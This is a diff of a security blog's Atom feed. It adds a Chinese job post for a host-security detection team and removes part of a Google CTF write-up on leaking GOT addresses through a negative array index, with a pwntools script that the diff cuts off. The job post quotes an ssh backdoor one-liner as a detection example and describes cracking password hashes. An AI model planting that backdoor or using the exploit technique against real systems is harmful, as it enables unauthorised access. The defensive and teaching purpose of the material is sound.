@@ -1,4 +1,160 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="https://strcpy.me/feed/index.xml" rel="self" type="application/atom+xml" /><link href="https://strcpy.me/" rel="alternate" type="text/html" /><updated>2021-06-04T07:30:15+00:00</updated><id>https://strcpy.me/</id><title type="html">virusdefender’s blog (＾－＾)V</title><subtitle>学而不思则罔，思而不学则殆</subtitle><author><name>virusdefender</name></author><entry><title type="html">2019 &amp;amp;&amp;amp; 2020</title><link href="https://strcpy.me/index.php/archives/799/" rel="alternate" type="text/html" title="2019 &amp;&amp; 2020" /><published>2020-12-31T00:00:01+00:00</published><updated>2020-12-31T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/%E8%BF%99%E4%B8%80%E5%B9%B4%E5%8D%8A%E6%88%91%E5%9C%A8%E5%B9%B2%E4%BB%80%E4%B9%88</id><content type="html" xml:base="https://strcpy.me/index.php/archives/799/">&lt;p&gt;往年在年底我会写一篇年度总结的文章，历史文章文章列表可以见博客 “年度分类” tag，但是 2020 年过了几个月我才想起来没有写 2019 年的总结，也索性就先不写了。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="https://strcpy.me/feed/index.xml" rel="self" type="application/atom+xml" /><link href="https://strcpy.me/" rel="alternate" type="text/html" /><updated>2021-08-03T09:00:58+00:00</updated><id>https://strcpy.me/</id><title type="html">virusdefender’s blog (＾－＾)V</title><subtitle>学而不思则罔，思而不学则殆</subtitle><author><name>virusdefender</name></author><entry><title type="html">招聘</title><link href="https://strcpy.me/index.php/archives/job/" rel="alternate" type="text/html" title="招聘" /><published>2021-08-01T00:00:01+00:00</published><updated>2021-08-01T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/job</id><content type="html" xml:base="https://strcpy.me/index.php/archives/job/">&lt;h1 id=&quot;招聘专栏&quot;&gt;招聘专栏&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#牧云安全研发工程师&quot;&gt;牧云安全研发工程师&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#友情帮招monoidtech-前端工程师&quot;&gt;（友情帮招）monoidtech 前端工程师&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;牧云安全研发工程师&quot;&gt;牧云安全研发工程师&lt;/h2&gt;
+
+&lt;h3 id=&quot;牧云是什么&quot;&gt;牧云是什么&lt;/h3&gt;
+
+&lt;p&gt;牧云是长亭科技信息安全产品体系中的重要一环，为主机安全方向，介绍信息可见 &lt;a href=&quot;https://www.chaitin.cn/zh/cloudwalker&quot;&gt;https://www.chaitin.cn/zh/cloudwalker&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;下面是按照模块功能的一个粗略分类：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;资产收集
+    &lt;ul&gt;
+      &lt;li&gt;主机基本信息&lt;/li&gt;
+      &lt;li&gt;软件应用&lt;/li&gt;
+      &lt;li&gt;web 站点&lt;/li&gt;
+      &lt;li&gt;docker 镜像、容器、网络等&lt;/li&gt;
+      &lt;li&gt;启动项、内核模块、用户、端口、进程等。&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;风险感知
+    &lt;ul&gt;
+      &lt;li&gt;漏洞扫描&lt;/li&gt;
+      &lt;li&gt;补丁管理&lt;/li&gt;
+      &lt;li&gt;弱口令&lt;/li&gt;
+      &lt;li&gt;合规、安全基线&lt;/li&gt;
+      &lt;li&gt;暴力破解&lt;/li&gt;
+      &lt;li&gt;…&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;入侵检测
+    &lt;ul&gt;
+      &lt;li&gt;反弹 shell&lt;/li&gt;
+      &lt;li&gt;Webshell&lt;/li&gt;
+      &lt;li&gt;命令审计&lt;/li&gt;
+      &lt;li&gt;恶意文件&lt;/li&gt;
+      &lt;li&gt;本地提权&lt;/li&gt;
+      &lt;li&gt;网络异常&lt;/li&gt;
+      &lt;li&gt;…&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;牧云项目组的结构&quot;&gt;牧云项目组的结构&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;产品经理、设计师、测试、前后端等常见的岗位。&lt;/li&gt;
+  &lt;li&gt;系统研发工程师，主要是牧云探针研发，提供安全检测插件运行环境、调度、系统底层 api 封装整合等功能。&lt;/li&gt;
+  &lt;li&gt;安全工程师（其他的招聘网站上有时候也称为安全策略工程师）。
+    &lt;ul&gt;
+      &lt;li&gt;偏安全研究方向，专注几个小方向，提供检测思路，可能写代码较少。&lt;/li&gt;
+      &lt;li&gt;偏安全研发方向，也就是我所在团队，目前五六个人，为小型化的团队。&lt;strong style=&quot;color: red;&quot;&gt;这是本招聘的重点所在。&lt;/strong&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;安全研发在做什么&quot;&gt;安全研发在做什么&lt;/h3&gt;
+
+&lt;p&gt;安全研发我们目前的招聘方向偏研发，你能熟悉安全就更好了。&lt;/p&gt;
+
+&lt;h4 id=&quot;如果你偏向做安全&quot;&gt;如果你偏向做安全&lt;/h4&gt;
+
+&lt;p&gt;安全研究方向的同学也只是覆盖一小部分的主机安全场景，比如 Webshell 检测、Windows 安全相关等等，
+剩下的还是安全研发方向的同学在做，所以可以理解安全研发会更偏向写代码一些，但是并不是完全不去思考检测思路。&lt;/p&gt;
+
+&lt;p&gt;做过的事情举例如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;很多文档方案中，检测反弹 shell 都是基于命令行特征和简单网络关系的粗糙处理，漏报会多一些，而我们将这些思路进行了非常精细化的处理，补充了一些新姿势，目前效果挺不错的。&lt;/li&gt;
+  &lt;li&gt;从集成第三方杀软到自己编写很多 yara 规则到基于函数调用关系的恶意文件检测，而且能进行打标和给出详细说明。我们专注于黑客软件和 exploit 的检测，这是对企业安全最大的威胁之一。&lt;/li&gt;
+  &lt;li&gt;命令审计，简单理解就是对命令行信息的匹配，比如 ssh 后门 &lt;code class=&quot;highlighter-rouge&quot;&gt;ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oport=12345&lt;/code&gt;，堆规则大家都会，如何让这个插件效果更好呢？我们设计开发了基于 bash session 关系的黑客操作习惯检测、命令行中 ip、域名等威胁情报检测、反弹 shell 记录全量命令等等功能。&lt;/li&gt;
+  &lt;li&gt;弱口令识别不是对服务直接进行暴力破解，而是基于数据文件分析得到哈希值进行爆破的，比如 Linux 用户密码在 &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; 文件中存储，获取哈希比较简单，但是对于数据库类型（比如 MySQL+多种存储引擎、Oracle、PostgreSQL 等），如何分析一个用户表数据文件得到哈希就需要对存储引擎进行深入的理解和研究了，我们都已经基本搞定了。&lt;/li&gt;
+  &lt;li&gt;用户配置的密码字典可能比较小，需要按照攻击者的思维进行自动化的信息收集来生成一个新的字典供用户参考。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;如果你偏向研发不怎么懂安全&quot;&gt;如果你偏向研发，不怎么懂安全&lt;/h4&gt;
+
+&lt;p&gt;这个也没有关系，我们也维护多个安全检测服务，偏向后端方向，而且我们认为转安全方向也并不难。&lt;/p&gt;
+
+&lt;p&gt;做过的事情举例如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;同步 nvd、cnnvd 等漏洞情报数据、应用资产描述、oval 漏洞匹配规则、一些自行维护的漏洞匹配规则、系统补丁信息，将这些数据进行整合和编辑，输出为数据库，支撑漏洞匹配、漏洞情报、补丁管理、补丁情报等功能。&lt;/li&gt;
+  &lt;li&gt;上述的漏洞和补丁相关功能为一个单独的服务，基于数据和规则文件进行扫描和匹配，和后端使用 rpc 通信，服务可以热更新。&lt;/li&gt;
+  &lt;li&gt;恶意文件检测也是一个单独的服务，需要管理文件的分发规则，封装第三方杀软、自研引擎的接口，统一多种接入方式（因为这是一个通用项目，可能对接多种队列、数据上报 rpc 等），管理检测缓存，提供类似 VirusTotal 一样的内部扫描界面，管理引擎更新，引擎监控等。&lt;/li&gt;
+  &lt;li&gt;弱口令识别中，需要类似彩虹表一样去缓存哈希运算的结果，但是又不能无限制的存储，需要去压缩和淘汰低频访问数据。&lt;/li&gt;
+  &lt;li&gt;检测插件是 Lua 写的，但是这种语言对大型项目非常不友好，我们参考了已有的一些开源项目，最终选择了一种带类型的 Lua 方言，但是开源项目并不完全满足需求，我们又对其进行了修改和增加了一些配套工具，比如构建工具、lint 工具等。（详见 &lt;a href=&quot;https://strcpy.me/index.php/archives/799/&quot;&gt;这里&lt;/a&gt; ）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;其他要求--工作环境--薪资待遇&quot;&gt;其他要求 / 工作环境 / 薪资待遇&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;做事认真，有创新能力，思维活跃。&lt;/li&gt;
+  &lt;li&gt;工作中不要被推着往前走，能积极的贡献自己的想法，推动想法去实现和落地。&lt;/li&gt;
+  &lt;li&gt;没有比较紧急的事情不会要求加班，2020 年周末加班次数小于五次。&lt;/li&gt;
+  &lt;li&gt;最好 base 北京，但是杭州也可以。&lt;/li&gt;
+  &lt;li&gt;工作时间大概为 &lt;code class=&quot;highlighter-rouge&quot;&gt;10:00&lt;/code&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;19:00&lt;/code&gt;，保证总工作时间的基础上，可以浮动。&lt;/li&gt;
+  &lt;li&gt;薪资待遇与多种因素相关，比如面试结果、评估的职级等，但是可以保证的是，不会低于对应职级在互联网公司中的常见工资。如果你是大牛，什么都可以谈。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;投递简历&quot;&gt;投递简历&lt;/h3&gt;
+
+&lt;p&gt;可以将简历发送到 &lt;span id=&quot;email&quot;&gt;&lt;/span&gt; 或者 &lt;span id=&quot;email1&quot;&gt;&lt;/span&gt; 。&lt;/p&gt;
+
+&lt;p&gt;也可以加我的微信 &lt;span id=&quot;weixin&quot;&gt;&lt;/span&gt; 来聊一聊其他你感兴趣的问题。&lt;/p&gt;
+
+&lt;p&gt;不局限于安全研发，对长亭的所有研发岗位感兴趣都可以通过上述渠道联系我。&lt;/p&gt;
+
+&lt;script&gt;
+	document.getElementById(&quot;email&quot;).innerHTML = atob(&quot;dmlydXNkZWZlbmRlckBvdXRsb29rLmNvbQ==&quot;);
+	document.getElementById(&quot;email1&quot;).innerHTML = atob(&quot;eWFuZy5saUBjaGFpdGluLmNvbQ==&quot;);
+	document.getElementById(&quot;weixin&quot;).innerHTML = atob(&quot;dmlydXNkZWZlbmRlcg==&quot;);
+&lt;/script&gt;
+
+&lt;h2 id=&quot;友情帮招monoidtech-前端工程师&quot;&gt;（友情帮招）monoidtech 前端工程师&lt;/h2&gt;
+
+&lt;h3 id=&quot;公司背景&quot;&gt;公司背景&lt;/h3&gt;
+
+&lt;p&gt;本部是一家在日本的互联网公司现因公司业务扩张，需要更多能在远程工作的程序员，目前团队有 10 多个人。&lt;/p&gt;
+
+&lt;h3 id=&quot;工作条件&quot;&gt;工作条件&lt;/h3&gt;
+
+&lt;p&gt;签合约至少半年，如果合作顺利可延长，相对于 free 比较稳定。&lt;/p&gt;
+
+&lt;p&gt;工作时间属于弹性制，不需要坐班，你的时间会很自由，但要保证每天有时间和团队一起做好及时的沟通，有效率的完成任务。&lt;/p&gt;
+
+&lt;h3 id=&quot;技术要求&quot;&gt;技术要求&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;熟悉计算机基础知识，有算法基础，懂计算机网络&lt;/li&gt;
+  &lt;li&gt;HTML 基础扎实，对 CSS 主流布局熟悉&lt;/li&gt;
+  &lt;li&gt;熟悉或者接触过: React, TypeScript&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;加分项要求&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;有过远程工作经验者，有读写英文能力的优先&lt;/li&gt;
+  &lt;li&gt;有日语能力的优先&lt;/li&gt;
+  &lt;li&gt;有团队管理经验者优先&lt;/li&gt;
+  &lt;li&gt;有 Github 的展示 repo (请发链接)&lt;/li&gt;
+  &lt;li&gt;有 React Native, iOS/Android 经验优先&lt;/li&gt;
+  &lt;li&gt;有后端经验&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;签约条件和薪资待遇&quot;&gt;签约条件和薪资待遇&lt;/h3&gt;
+
+&lt;p&gt;通过日本公司/国内分公司签约，工资为时薪制，起步价 2500 日元（150 人民币） / 小时（如果经验丰富，有加分项，价格可以谈）。&lt;/p&gt;
+
+&lt;h3 id=&quot;联系方式&quot;&gt;联系方式&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ymao@monoidtech.com&lt;/code&gt; 请注明来自 &lt;code class=&quot;highlighter-rouge&quot;&gt;OnlineJudge&lt;/code&gt; 开源项目&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="其他" /><summary type="html">招聘专栏</summary></entry><entry><title type="html">2019 &amp;amp;&amp;amp; 2020</title><link href="https://strcpy.me/index.php/archives/799/" rel="alternate" type="text/html" title="2019 &amp;&amp; 2020" /><published>2020-12-31T00:00:01+00:00</published><updated>2020-12-31T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/%E8%BF%99%E4%B8%80%E5%B9%B4%E5%8D%8A%E6%88%91%E5%9C%A8%E5%B9%B2%E4%BB%80%E4%B9%88</id><content type="html" xml:base="https://strcpy.me/index.php/archives/799/">&lt;p&gt;往年在年底我会写一篇年度总结的文章，历史文章文章列表可以见博客 “年度分类” tag，但是 2020 年过了几个月我才想起来没有写 2019 年的总结，也索性就先不写了。&lt;/p&gt;
 
 &lt;p&gt;所以本文其实是 2019 年和 2020 年两年的总结合并而来，不过不重要，技术和生活上的事情都是连贯的。&lt;/p&gt;
 
@@ -1293,136 +1449,4 @@ autoanalyze_count   | 3
 
 &lt;p&gt;两只小龟几个月已经长了一厘米了，由 2.7cm 和 3.5 cm 长到了 3.5cm 和 4.5 cm。不过最近小龟有些生病，左眼睛肿的厉害，滴了左氧氟沙星之后会好很多，然后呼气有声音，貌似也有肺炎，不过吃饭和精神还不错，就暂时没有多加干预。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="生活" /><summary type="html">前几个月妹子买了两只小龟，是密西西比红耳龟，国内一般称巴西龟，淘宝上小苗子一般几块钱一只。我之后又买了一些草金鱼，一开始是 20 多条，除去陆续死掉的和看样子不大行喂了龟的，现在还剩一半，已经一段时间没有死过了。</summary></entry><entry><title type="html">二进制安全之栈溢出（十一）</title><link href="https://strcpy.me/index.php/archives/790/" rel="alternate" type="text/html" title="二进制安全之栈溢出（十一）" /><published>2018-11-09T12:46:07+00:00</published><updated>2018-11-09T12:46:07+00:00</updated><id>https://strcpy.me/index.php/archives/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA(%E5%8D%81%E4%B8%80)</id><content type="html" xml:base="https://strcpy.me/index.php/archives/790/">&lt;p&gt;本文是 plt 和 got 表相关的漏洞利用实例，是 &lt;a href=&quot;https://github.com/BOAKGP/CTF-Writeups/tree/master/Google%20CTF%202018%20Quals%20Beginners%20Quest/Fridge%20todo%20list&quot;&gt;Google CTF&lt;/a&gt; 中的一道题，题目给了源码和 binary。&lt;/p&gt;
-
-&lt;p&gt;通过阅读代码，可以发现&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;int idx = read_int();
-if (idx &amp;gt; TODO_COUNT) {
-    puts(OUT_OF_BOUNDS_MESSAGE);
-    return;
-}
-printf(&quot;What's your TODO? &quot;);
-fflush(stdout);
-read_line(&amp;amp;todos[idx*TODO_LENGTH], TODO_LENGTH);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这里虽然检查了 &lt;code class=&quot;highlighter-rouge&quot;&gt;idx&lt;/code&gt; 最大不能超过某个范围，但是没有检查小于零的情况，所以如果构造小于零的 &lt;code class=&quot;highlighter-rouge&quot;&gt;idx&lt;/code&gt;，就可以读取比 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 数组地址还小的位置的内存了，同理，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;write_all&lt;/code&gt; 函数中，也可以任意的去写这个位置的内存。&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 是一个全局变量，所以它的内存地址是确定的，是在 bss 段。因为 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 的索引会乘以 &lt;code class=&quot;highlighter-rouge&quot;&gt;TODO_LENGTH&lt;/code&gt;，所以内存的读取是跳跃的，每次都相差 48 个字节。&lt;/p&gt;
-
-&lt;p&gt;使用 gdb 调试，&lt;code class=&quot;highlighter-rouge&quot;&gt;set follow-fork-mode parent&lt;/code&gt; 然后 &lt;code class=&quot;highlighter-rouge&quot;&gt;b main&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;p &amp;amp;todos&lt;/code&gt; 可以看到内存地址。&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ p &amp;amp;todos
-$1 = (&amp;lt;data variable, no debug info&amp;gt; *) 0x555555757140 &amp;lt;todos&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;在 IDA 中，也可以看到 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;got&lt;/code&gt; 表距离也非常近，写一个小程序算一下&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/790/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x203140&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;结合 IDA 的结果和计算输出的结果，可以标记出来一些有用的数据&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x203140 -&amp;gt; todos
-0x203110
-0x2030e0
-0x2030b0
-         0x203088（非整数倍） -&amp;gt; atoi
-0x203080 -&amp;gt; open
-0x203050 -&amp;gt; strncat
-0x203020 -&amp;gt; write
-0x202ff0
-0x202fc0
-0x202f90
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;比如先读一下 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 的地址&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[-------------------------------------code-------------------------------------]
-   0x555555554900 &amp;lt;puts@plt&amp;gt;:	jmp    QWORD PTR [rip+0x202712]        # 0x555555757018
-   0x555555554906 &amp;lt;puts@plt+6&amp;gt;:	push   0x0
-   0x55555555490b &amp;lt;puts@plt+11&amp;gt;:	jmp    0x5555555548f0
-=&amp;gt; 0x555555554910 &amp;lt;write@plt&amp;gt;:	jmp    QWORD PTR [rip+0x20270a]        # 0x555555757020
- | 0x555555554916 &amp;lt;write@plt+6&amp;gt;:	push   0x1
- | 0x55555555491b &amp;lt;write@plt+11&amp;gt;:	jmp    0x5555555548f0
- | 0x555555554920 &amp;lt;strlen@plt&amp;gt;:	jmp    QWORD PTR [rip+0x202702]        # 0x555555757028
- | 0x555555554926 &amp;lt;strlen@plt+6&amp;gt;:	push   0x2
- |-&amp;gt;   0x555555554916 &amp;lt;write@plt+6&amp;gt;:	push   0x1
-       0x55555555491b &amp;lt;write@plt+11&amp;gt;:	jmp    0x5555555548f0
-       0x555555554920 &amp;lt;strlen@plt&amp;gt;:	jmp    QWORD PTR [rip+0x202702]        # 0x555555757028
-       0x555555554926 &amp;lt;strlen@plt+6&amp;gt;:	push   0x2
-                                                                  JUMP is taken
-[------------------------------------stack-------------------------------------]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;重新画一下数据分布图&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x555555757140 -&amp;gt; todos
-0x555555757110
-0x5555557570e0
-0x5555557570b0
-0x555555757080
-0x555555757050
-0x555555757020 =&amp;gt; 0x555555554916 -&amp;gt; write@plt+6
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;由以前的知识就知道 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x555555757020&lt;/code&gt; 就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 的 got 表的地址，减去刚才已知的 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 的位置，正好是 &lt;code class=&quot;highlighter-rouge&quot;&gt;(0x555555757020 - 0x555555757140) / 48 == -6&lt;/code&gt;。&lt;/p&gt;
-
-&lt;p&gt;可以先构造一个读取 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 的 got 表地址 exp&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./todo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;read?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hi admin,&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
